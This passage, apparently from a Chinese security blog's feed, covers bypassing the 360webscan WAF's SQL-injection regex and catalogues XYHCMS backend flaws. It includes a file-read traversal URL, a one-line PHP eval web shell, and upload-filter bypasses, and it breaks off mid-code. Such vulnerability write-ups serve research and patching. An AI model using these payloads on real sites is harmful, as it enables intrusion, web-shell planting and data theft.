&quot;\\b(and|or)\\b([&#39;\&quot;\\d]+?&#x3D;[&#39;\&quot;\\d]+?|[&#39;\&quot;a-zA-Z]+?&#x3D;[&#39;\&quot;a-zA-Z]+?|&gt;|&lt;|\s+?[\\w]+?\\s+?\\bin\\b\\s*?\(|\\blike\\b\\s+?[\&quot;&#39;])|\\&#x2F;\\*.+?\\*\\&#x2F;|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)&quot;;</span></pre></td></tr></table></figure><p>是正则表达式设置规则，因此可利用<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">def exp():</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    domain &#x3D; &#39;http:&#x2F;&#x2F;debug.com&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    path &#x3D; &#39;&#x2F;test.php&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain + path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    headers &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    # payload &#x3D; &quot;select *&#x2F;*&quot;+&#39;a&#39;*1000000+&#39;*&#x2F; from aaa&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    payload &#x3D; &quot;select * from aaa&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    data &#x3D; &#123;&quot;id&quot;: payload&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    url &#x3D; domain+path</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    res &#x3D; requests.post(url&#x3D;url, data&#x3D;data, headers&#x3D;headers)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    if &#39;webscan&#39;in res.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        print(&quot;fobidden!\n&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        exit()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">    print(res.text)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    exp()</span></pre></td></tr></table></figure><p>当直接传参时候,显示拦截了</p><p><img src="/images/360webscan7.png" alt=""></p><p>当填充<code>payload</code>即<code>id</code>参数中1000000个a时</p><p><img src="/images/360webscan8.png" alt=""></p><h2 id="插入绕过正则"><a href="#插入绕过正则" class="headerlink" title="插入绕过正则"></a>插入绕过正则</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">INSERT\\s+INTO.+?VALUES</span></pre></td></tr></table></figure><p>insert 数据可以用另几种方式</p><ol><li><code>insert into table set name = &#39;admin&#39;,pass = &#39;123456&#39;</code></li><li><code>insert table(name,password) values(&#39;admin&#39;,&#39;123456&#39;)</code></li><li><code>insert into table(name,password) select &#39;admin&#39;,&#39;123456&#39;</code></li></ol><p>这几种写法可以随意组合着用</p><p>可用性测试：</p><p><img src="/images/360webscan12.png" alt=""></p><p>绕过测试</p><p><img src="/images/360webscan9.png" alt=""></p><p><img src="/images/360webscan10.png" alt=""></p><p><img src="/images/360webscan11.png" alt=""></p><p>另外，还可以用 <code>replace into</code>来代替<code>insert</code>与<code>update</code>，而且<code>replace into</code>也有和<code>insert into</code>一样的三种写法加上一种普通写法都可以绕过。</p><h2 id="老版本绕过"><a href="#老版本绕过" class="headerlink" title="老版本绕过"></a>老版本绕过</h2><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p> WEBSCAN_VERSION：0.1.3.2 </p><p>先在使用了360通防的页面上发送<code>?id=union select ’1,2,3&#39;</code>若是拦截，再发送<code>id = union select!1,2,3</code>不拦截，则可以union绕过。</p><p>可使用</p><ol><li><code>union select!1,user(),3</code></li><li><code>union select@1,user(),3</code></li></ol><p>若是数据库编码不是utf-8则可以使用%a0隔绝select与from造成绕过。（编码问题不懂）</p><p><code>select%a0*%a0from%20tables</code></p>]]></content>
    
    <summary type="html">
    
      绕过360webscan通防的方法
    
    </summary>
    
    
      <category term="waf" scheme="http://h3art3ars.github.io/categories/waf/"/>
    
    
      <category term="waf" scheme="http://h3art3ars.github.io/tags/waf/"/>
    
      <category term="bypass" scheme="http://h3art3ars.github.io/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>xyhcms漏洞整理</title>
    <link href="http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <id>http://h3art3ars.github.io/2020/01/27/xyhcms%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</id>
    <published>2020-01-27T07:35:37.000Z</published>
    <updated>2020-01-27T07:44:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h2><ul><li>v3.5</li><li>v3.6</li><li>v2</li></ul><h3 id="任意文件读取（后台）"><a href="#任意文件读取（后台）" class="headerlink" title="任意文件读取（后台）"></a>任意文件读取（后台）</h3><ul><li><h4 id="漏洞文件位置"><a href="#漏洞文件位置" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p>/App/Manage/Controller/TempletsController.class.php 第59-83行：</p></li><li><h4 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>没有对传入的fname参数进行过滤</p></li><li><h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function edit() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$ftype &#x3D; I(&#39;ftype&#39;, 0, &#39;intval&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; I(&#39;fname&#39;, &#39;&#39;, &#39;trim,htmlspecialchars&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$file_path &#x3D; !$ftype ? &#39;.&#x2F;Public&#x2F;Home&#x2F;&#39; . C(&#39;CFG_THEMESTYLE&#39;) . &#39;&#x2F;&#39; : &#39;.&#x2F;Public&#x2F;Mobile&#x2F;&#39; . C(&#39;CFG_MOBILE_THEMESTYLE&#39;) . &#39;&#x2F;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;未指定文件名&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$_ext &#x3D; &#39;.&#39; . pathinfo($fname, PATHINFO_EXTENSION);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">$_cfg_ext &#x3D; C(&#39;TMPL_TEMPLATE_SUFFIX&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">if ($_ext !&#x3D; $_cfg_ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件后缀必须为&quot;&#39; . $_cfg_ext . &#39;&quot;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; I(&#39;content&#39;, &#39;&#39;, &#39;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; ltrim($fname, &#39;.&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">if (stripos($content, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;模板内容禁止包含php代码！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; file_put_contents($truefile, $content)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">$this-&gt;success(&#39;保存成功&#39;, U(&#39;index&#39;, array(&#39;ftype&#39; &#x3D;&gt; $ftype)));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">&#125; else &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;保存文件失败，请重试&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">$fname &#x3D; base64_decode($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">var_dump($fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;exit();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">if (empty($fname)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;未指定要编辑的文件&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line">$truefile &#x3D; $file_path . $fname;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">if (!file_exists($truefile)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件不存在&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; file_get_contents($truefile);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line">if ($content &#x3D;&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;读取文件失败&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line">$content &#x3D; htmlspecialchars($content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;ftype&#39;, $ftype);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;fname&#39;, $fname);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">57</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;content&#39;, $content);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">58</span></pre></td><td class="code"><pre><span class="line">$this-&gt;assign(&#39;type&#39;, &#39;修改模板&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">59</span></pre></td><td class="code"><pre><span class="line">$this-&gt;display();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">60</span></pre></td><td class="code"><pre><span class="line">  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">61</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><ul><li><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>数据库配置文件路径：<code>\App\Common\Conf\db.php</code> </li><li>组成相对路径 <code>..\\..\\..\\App\\Common\\Conf\\db.php</code></li><li>base64编码，<code>Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li><li>最后构造的链接形式如下：<code>http://127.0.0.1/xyhai.php?s=/Templets/edit/fname/Li5cXC4uXFwuLlxcQXBwXFxDb21tb25cXENvbmZcXGRiLnBocA==</code> </li></ol></li><li><h4 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h4><p>下载v3.5，发现代码已经做了过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (false !&#x3D;&#x3D; strpos($fname, &#39;&#x2F;&#39;) || false !&#x3D;&#x3D; strpos($fname, &#39;\\&#39;)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;文件名不允许包含非法字符，如\&#x2F;&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li></ul><h3 id="文件写入导致代码执行漏洞（后台）"><a href="#文件写入导致代码执行漏洞（后台）" class="headerlink" title="文件写入导致代码执行漏洞（后台）"></a>文件写入导致代码执行漏洞（后台）</h3><ul><li><h4 id="漏洞文件位置-1"><a href="#漏洞文件位置-1" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p></li><li><h4 id="漏洞原因-1"><a href="#漏洞原因-1" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对写入文件的内容过滤不严</p></li><li><h4 id="漏洞代码-1"><a href="#漏洞代码-1" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function site() &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">if (IS_POST) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$data &#x3D; I(&#39;config&#39;, array(), &#39;trim&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">$preg_param &#x3D; &#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;&#x2F;is&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">foreach ($data as $key &#x3D;&gt; $val) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">if (stripos($val, &#39;&lt;?php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;\?php(.+?)\?&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">————————————————————————————————————————————————————————————————————————————</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">if (stripos($val, &#39;&lt;script&#39;) !&#x3D;&#x3D; false &amp;&amp; stripos($val, &#39;php&#39;) !&#x3D;&#x3D; false) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">$data[$key] &#x3D; preg_replace(&#39;&#x2F;&lt;script\s+language[\s&#x3D;]+[&quot;\&#39;]*php[&quot;\&#39;]*[^&gt;]*?\&gt;.*?&lt;\&#x2F;script&gt;&#x2F;i&#39;, &#39;&#39;, $val);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">if (stripos($data[$key], &#39;&lt;?php&#39;) !&#x3D;&#x3D; false || preg_match($preg_param, $data[$key])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;禁止输入php代码&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">————————————————————————————————————————————————————————————————————————————</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置-&gt;会员配置-&gt;禁止使用的名称</p><p><img src="/images/xyhcms-1.png" alt="xyhcms"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?eval($_POST[&#39;cmd&#39;])?&gt;</span></pre></td></tr></table></figure></li><li><p>访问漏洞文件,蚁剑连接</p><p><code>http://localhost/App/Runtime/Data/config/site.php</code></p><p>POST数据：<code>cmd=phpinfo();</code></p></li></ol></li><li><h4 id="实际利用-1"><a href="#实际利用-1" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.6也存在</p></li></ul><h3 id="文件写入导致代码执行漏洞2（后台）"><a href="#文件写入导致代码执行漏洞2（后台）" class="headerlink" title="文件写入导致代码执行漏洞2（后台）"></a>文件写入导致代码执行漏洞2（后台）</h3><ul><li><h4 id="漏洞原因-2"><a href="#漏洞原因-2" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>过滤不严</p></li><li><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置找个任意的配置</p></li><li><p>在输入框内都填</p><p><code>&lt;?php phpinfo()?&gt;</code></p></li><li><p>访问漏洞文件</p><p><code>http://localhost/App/Runtime/Data/config/site.php</code></p></li><li><p>此漏洞在最新版的v3.6也存在</p></li></ol></li><li><h4 id="实际利用-2"><a href="#实际利用-2" class="headerlink" title="实际利用"></a>实际利用</h4><p>v3.5，v3.6都利用成功</p></li></ul><h3 id="文件上传漏洞（后台-amp-配置了-htaccess）"><a href="#文件上传漏洞（后台-amp-配置了-htaccess）" class="headerlink" title="文件上传漏洞（后台&amp;配置了.htaccess）"></a>文件上传漏洞（后台&amp;配置了.htaccess）</h3><ul><li><h4 id="漏洞文件位置-2"><a href="#漏洞文件位置-2" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code> Line 246-255</p></li><li><h4 id="漏洞原因-3"><a href="#漏洞原因-3" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>对后缀过滤不严，未过滤php3-5，phtml（老版本直接未过滤php）</p></li><li><h4 id="漏洞代码-2"><a href="#漏洞代码-2" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><p>在site方法中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">foreach ($_file_exts as $ext) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">if (in_array($ext, $_no_exts)) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">$this-&gt;error(&#39;允许附件类型错误！不允许后缀为：php,asp,aspx,jsp！&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure></li><li><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li><p>进入后台</p></li><li><p>系统设置-&gt;网站设置-&gt;上传配置-&gt;允许附件类型</p></li><li><p>添加类型 <code>php3</code>或 <code>php4</code>或 <code>php5</code> 或 <code>phtml</code></p></li><li><p>点击下面的 <code>水印图片上传</code>上传以上后缀shell，此时点不点提交都已经传入服务器</p></li><li><p>之后会在图片部分显示上传路径</p><p><img src="/images/xyhcms-2.png" alt="image2"></p></li><li><p>访问连接即可，只有网站配置了.htaccess自动解析php3-5与phtml的才能解析。</p></li></ol></li><li><h4 id="实际利用-3"><a href="#实际利用-3" class="headerlink" title="实际利用"></a>实际利用</h4><p>上传成功，但是不解析shell</p><p>V3.6也存在此漏洞</p><p>默认不解析php3-5,除非遇到个别的站</p></li></ul><h3 id="文件上传漏洞2（后台-amp-windows）"><a href="#文件上传漏洞2（后台-amp-windows）" class="headerlink" title="文件上传漏洞2（后台&amp;windows）"></a>文件上传漏洞2（后台&amp;windows）</h3><ul><li><h4 id="漏洞文件位置-3"><a href="#漏洞文件位置-3" class="headerlink" title="漏洞文件位置"></a>漏洞文件位置</h4><p><code>/App/Manage/Controller/SystemController.class.php</code></p></li><li><h4 id="漏洞原因-4"><a href="#漏洞原因-4" class="headerlink" title="漏洞原因"></a>漏洞原因</h4><p>windows系统特性，windows会将 <code>::$DATA</code>忽略</p></li><li><h4 id="漏洞代码-3"><a href="#漏洞代码-3" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">if (!empty($data[&#39;CFG_UPLOAD_FILE_EXT&#39;])) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$data[&#39;CFG_UPLOAD_FILE_EXT&#39;] &#x3D; strtolower($data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$_file_exts &#x3D; explode(&#39;,&#39;, $data[&#39;CFG_UPLOAD_FILE_EXT&#39;]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$_no_exts &#x3D; array(&#39;php&#39;, &#39;asp&#39;, &#39;aspx&#39;, &#39;jsp&#39;);</span></pre></td></tr><tr><td 